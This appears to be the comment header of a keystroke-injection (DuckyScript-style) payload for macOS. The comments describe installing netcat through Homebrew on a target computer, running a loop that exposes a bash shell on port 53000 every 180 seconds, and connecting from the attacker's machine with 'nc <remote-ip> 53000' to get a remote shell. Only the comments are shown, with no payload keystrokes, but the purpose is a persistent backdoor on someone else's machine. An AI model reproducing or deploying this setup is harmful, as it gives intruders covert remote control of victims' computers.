REM This script installs netcat using home-brew (can adjust delay) 
REM Sets up a continuous loop using netcat to establish a connection 
REM and execute a bash shell every 180 seconds.


REM Now on your separate computer in your terminal Run the command 'nc <remote-ip> 53000' 
REM replace '<remote-ip>' with the IP address of the target computer.
REM I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
REM If the connection is successful, you should now have a remote shell session on the remote computer.

REM To kill the listening port (53000 in this case) use the command below
REM killall nc


REM Requirements: install netcat on both the remote target and your computer 'brew install netcat'
REM Requirements: Remote computer's IP address or hostname
